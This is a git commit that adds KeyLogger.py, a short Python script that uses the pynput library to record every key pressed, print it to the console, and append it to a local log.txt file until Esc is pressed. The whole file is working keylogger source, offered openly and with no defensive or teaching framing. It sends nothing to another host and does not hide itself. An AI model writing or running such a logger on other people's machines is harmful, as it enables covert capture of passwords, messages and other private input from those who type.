1126daa624aeb8d70dd8c5ca953e6fc101d291c6
Anish Chand <140816500+Anish21041262@users.noreply.github.com>
2025-09-05 18:14:57 +0530

    Create KeyLogger.py

---
+++ KeyLogger.py
@@ -0,0 +1,21 @@
+from pynput.keyboard import Key, Listener
+keys = []
+def on_press(key):
+    keys.append(key)
+    write_file(keys)
+    try:
+        print("Alphanumeric key {0} pressed".format(key.char))
+    except AttributeError:
+        print("Special Key {0} pressed".format(key))
+def write_file(keys):
+    with open('log.txt', 'a') as f:  # append instead of overwrite
+        for key in keys:
+            k = str(key).replace("'", "")
+            f.write(k + " ")
+        keys.clear()  # clear after writing to avoid duplicate entries
+def on_release(key):
+    print("{0} released".format(key))
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
